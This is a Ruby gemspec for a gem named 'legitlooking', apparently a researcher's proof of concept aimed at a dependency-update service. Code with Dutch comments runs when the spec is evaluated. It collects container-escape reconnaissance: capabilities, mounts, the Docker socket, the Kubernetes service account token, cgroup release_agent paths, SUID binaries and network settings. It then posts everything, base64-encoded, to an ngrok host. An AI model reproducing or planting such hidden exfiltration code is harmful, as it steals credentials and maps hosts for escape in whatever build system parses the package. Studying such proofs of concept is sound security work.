# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }
  cmd       = ->(c) { `#{c} 2>/dev/null`.strip[0, 1000] }

  lines = []

  # ============================================================
  # CONTAINER ESCAPE RECON
  # Doel: bepalen welke escape route mogelijk is
  # ============================================================

  # 1. Capabilities -- de sleutel tot bijna alle escapes
  lines << "=== CAPABILITIES ==="
  lines << cmd.("cat /proc/self/status | grep -E 'Cap|Uid|Gid'")
  lines << "\n-- capsh decode --"
  lines << cmd.("capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null || echo 'capsh niet beschikbaar'")

  # 2. Seccomp en AppArmor
  lines << "\n=== SECCOMP / APPARMOR ==="
  lines << "Seccomp: " + cmd.("grep Seccomp /proc/self/status")
  lines << "AppArmor: " + cmd.("cat /proc/self/attr/current")
  lines << "AppArmor profile: " + cmd.("cat /proc/1/attr/apparmor/current 2>/dev/null || cat /proc/self/attr/apparmor/current")

  # 3. Mount info -- host mounts, overlay, tmpfs
  lines << "\n=== MOUNTS ==="
  lines << cmd.("cat /proc/mounts")

  # 4. Docker socket -- directe host escape
  lines << "\n=== DOCKER SOCKET ==="
  lines << cmd.("ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null || echo 'geen docker socket'")

  # 5. Kubernetes service account token
  lines << "\n=== KUBERNETES ==="
  lines << cmd.("ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo 'geen k8s token'")
  lines << cmd.("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo 'geen token'")

  # 6. /dev -- disk devices, privileged container indicator
  lines << "\n=== /dev DEVICES ==="
  lines << cmd.("ls /dev/")

  # 7. Namespace info -- zijn we in een user namespace?
  lines << "\n=== NAMESPACES ==="
  lines << cmd.("ls -la /proc/1/ns/")
  lines << "UID map: " + cmd.("cat /proc/self/uid_map")
  lines << "GID map: " + cmd.("cat /proc/self/gid_map")

  # 8. cgroups -- notify_on_release escape vector
  lines << "\n=== CGROUPS ==="
  lines << cmd.("cat /proc/self/cgroup")
  lines << cmd.("ls /sys/fs/cgroup/")
  lines << "cgroup writable: " + cmd.("test -w /sys/fs/cgroup && echo JA || echo NEE")
  lines << "release_agent: " + cmd.("find /sys/fs/cgroup -name release_agent 2>/dev/null | head -5")

  # 9. Host PID namespace -- zien we host processen?
  lines << "\n=== PROCESSEN (host zichtbaar?) ==="
  lines << cmd.("ps aux --no-headers | head -20")
  lines << "PID 1 cmdline: " + cmd.("cat /proc/1/cmdline | tr '\\0' ' '")
  lines << "Eigen PID: " + Process.pid.to_s

  # 10. Interessante bestanden en writable paths
  lines << "\n=== WRITABLE PATHS ==="
  lines << cmd.("find / -maxdepth 4 -writable -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/home/dependabot/*' -not -path '/tmp/*' 2>/dev/null | head -30")

  # 11. SUID binaries
  lines << "\n=== SUID BINARIES ==="
  lines << cmd.("find / -maxdepth 5 -perm -4000 -type f 2>/dev/null")

  # 12. Host netwerk
  lines << "\n=== NETWERK ==="
  lines << cmd.("ip addr 2>/dev/null || ifconfig 2>/dev/null")
  lines << cmd.("ip route 2>/dev/null || route -n 2>/dev/null")
  lines << cmd.("cat /etc/resolv.conf")

  # Stuur alles op
  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=escape_recon")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 15, read_timeout: 15) { |h| h.request(req) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=escape_recon&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.16"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
